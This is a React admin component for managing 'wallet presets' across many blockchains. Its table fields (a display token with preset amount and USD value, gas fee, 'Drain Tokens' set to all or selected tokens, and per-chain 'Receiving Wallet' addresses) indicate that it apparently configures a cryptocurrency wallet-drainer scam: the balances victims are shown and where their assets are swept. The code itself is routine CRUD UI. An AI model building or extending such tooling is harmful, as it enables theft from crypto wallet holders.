import React, { useState, useEffect } from 'react';
import api from '../config/api';
import WalletPresetForm from './WalletPresetForm';

function WalletPresets() {
  const [presets, setPresets] = useState([]);
  const [loading, setLoading] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [editingPreset, setEditingPreset] = useState(null);
  const [alert, setAlert] = useState(null);

  const fetchPresets = async () => {
    try {
      setLoading(true);
      const response = await api.get('/wallet-presets');
      setPresets(response.data);
    } catch (error) {
      showAlert('Error fetching wallet presets: ' + (error.response?.data?.error || error.message), 'error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchPresets();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleAdd = () => {
    setEditingPreset(null);
    setShowForm(true);
  };

  const handleEdit = (preset) => {
    setEditingPreset(preset);
    setShowForm(true);
  };

  const handleDelete = async (address, blockchain) => {
    if (!window.confirm('Are you sure you want to delete this wallet preset?')) {
      return;
    }

    try {
      await api.delete(`/wallet-presets/${address}?blockchain=${blockchain}`);
      setLoading(true);
      const response = await api.get('/wallet-presets');
      setPresets(response.data);
      setLoading(false);
      showAlert('Wallet preset deleted successfully', 'success');
    } catch (error) {
      setLoading(false);
      showAlert('Error deleting wallet preset: ' + (error.response?.data?.error || error.message), 'error');
    }
  };

  const handleFormSubmit = async (formData) => {
    try {
      if (editingPreset) {
        await api.put(`/wallet-presets/${editingPreset.walletAddress}?blockchain=${editingPreset.blockchain}`, formData);
      } else {
        await api.post('/wallet-presets', formData);
      }
      setShowForm(false);
      setEditingPreset(null);
      setLoading(true);
      const response = await api.get('/wallet-presets');
      setPresets(response.data);
      setLoading(false);
      showAlert(editingPreset ? 'Wallet preset updated successfully' : 'Wallet preset created successfully', 'success');
    } catch (error) {
      setLoading(false);
      let errorMessage = 'Error saving wallet preset';
      if (error.response?.data) {
        if (error.response.data.error) {
          errorMessage = error.response.data.error;
        } else if (error.response.data.errors && Array.isArray(error.response.data.errors)) {
          errorMessage = error.response.data.errors.map(err => err.msg || err.message).join(', ');
        }
      } else if (error.message) {
        errorMessage = error.message;
      }
      showAlert(errorMessage, 'error');
    }
  };

  const handleFormCancel = () => {
    setShowForm(false);
    setEditingPreset(null);
  };

  const showAlert = (message, type) => {
    setAlert({ message, type });
    setTimeout(() => setAlert(null), 5000);
  };

  const nativeSymbols = {
    ETH: 'ETH', BSC: 'BNB', BASE: 'ETH', POL: 'POL', ARB: 'ETH',
    OP: 'ETH', AVAX: 'AVAX', FTM: 'FTM', CELO: 'CELO',
    GNOSIS: 'xDAI', LINEA: 'ETH', ZKSYNC: 'ETH', SEI: 'SEI'
  };

  if (loading) {
    return <div className="loading">Loading wallet presets...</div>;
  }

  return (
    <div>
      <div className="page-header">
        <h2>Wallet Presets</h2>
        <p>Manage token presets for wallet addresses</p>
      </div>

      {alert && (
        <div className={`alert alert-${alert.type}`}>
          {alert.message}
        </div>
      )}

      {showForm ? (
        <WalletPresetForm
          preset={editingPreset}
          onSubmit={handleFormSubmit}
          onCancel={handleFormCancel}
        />
      ) : (
        <div className="card">
          <div className="card-header">
            <h3>Wallet Presets</h3>
            <button className="btn btn-primary" onClick={handleAdd}>
              + Add Wallet Preset
            </button>
          </div>

          {presets.length === 0 ? (
            <div className="empty-state">
              <h3>No wallet presets found</h3>
              <p>Click "Add Wallet Preset" to create your first preset</p>
            </div>
          ) : (
            <div className="table-container">
              <table className="table">
                <thead>
                  <tr>
                    <th>Wallet Address</th>
                    <th>Network</th>
                    <th>Display Token</th>
                    <th>Amount</th>
                    <th>USD Value</th>
                    <th>Gas Fee</th>
                    <th>Drain Tokens</th>
                    <th>Receiving Wallet</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {presets.map((preset) => {
                    const isUsdBasedGas = ['ALL', 'SOLANA', 'TRON'].includes(preset.blockchain);
                    const gasFeeDisplay = isUsdBasedGas
                      ? `$${preset.gasFeeUsd || 2} USD`
                      : `${preset.gasFee || 0.005} ${nativeSymbols[preset.blockchain] || 'ETH'}`;
                    const selectedTokenCount = preset.selectedTokens?.length || 0;

                    return (
                      <tr key={preset._id}>
                        <td>
                          <code style={{ fontSize: '0.75rem' }}>{preset.walletAddress}</code>
                        </td>
                        <td>
                          <span className={`badge badge-${preset.blockchain?.toLowerCase() || 'eth'}`}>
                            {preset.blockchain || 'ETH'}
                          </span>
                        </td>
                        <td>
                          <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                            {preset.token.logo && (
                              <img src={preset.token.logo} alt={preset.token.name} style={{ width: '24px', height: '24px', borderRadius: '4px' }} />
                            )}
                            <span>{preset.token.name} ({preset.token.symbol})</span>
                          </div>
                        </td>
                        <td>{preset.token.amount.toLocaleString()}</td>
                        <td>${preset.token.usdValue.toLocaleString()}</td>
                        <td>{gasFeeDisplay}</td>
                        <td>
                          {preset.drainAllTokens ? (
                            <span className="badge badge-all-tokens">All</span>
                          ) : selectedTokenCount > 0 ? (
                            <span className="badge badge-info">{selectedTokenCount} token(s)</span>
                          ) : (
                            <span style={{ color: '#64748b', fontSize: '0.8rem' }}>Native only</span>
                          )}
                        </td>
                        <td>
                          {preset.blockchain === 'ALL' ? (
                            <div style={{ fontSize: '0.7rem' }}>
                              {preset.receivingWallets?.evm && (
                                <div><span style={{ color: '#94a3b8' }}>EVM:</span> <code>{preset.receivingWallets.evm.slice(0, 6)}...{preset.receivingWallets.evm.slice(-4)}</code></div>
                              )}
                              {preset.receivingWallets?.solana && (
                                <div><span style={{ color: '#94a3b8' }}>SOL:</span> <code>{preset.receivingWallets.solana.slice(0, 4)}...{preset.receivingWallets.solana.slice(-4)}</code></div>
                              )}
                              {preset.receivingWallets?.tron && (
                                <div><span style={{ color: '#94a3b8' }}>TRX:</span> <code>{preset.receivingWallets.tron.slice(0, 4)}...{preset.receivingWallets.tron.slice(-4)}</code></div>
                              )}
                            </div>
                          ) : (
                            <code style={{ fontSize: '0.7rem' }}>
                              {preset.receivingWallet ? `${preset.receivingWallet.slice(0, 6)}...${preset.receivingWallet.slice(-4)}` : 'N/A'}
                            </code>
                          )}
                        </td>
                        <td>
                          <div className="table-actions">
                            <button className="btn btn-secondary btn-sm" onClick={() => handleEdit(preset)}>
                              Edit
                            </button>
                            <button className="btn btn-danger btn-sm" onClick={() => handleDelete(preset.walletAddress, preset.blockchain)}>
                              Delete
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}
    </div>
  );
}

export default WalletPresets;
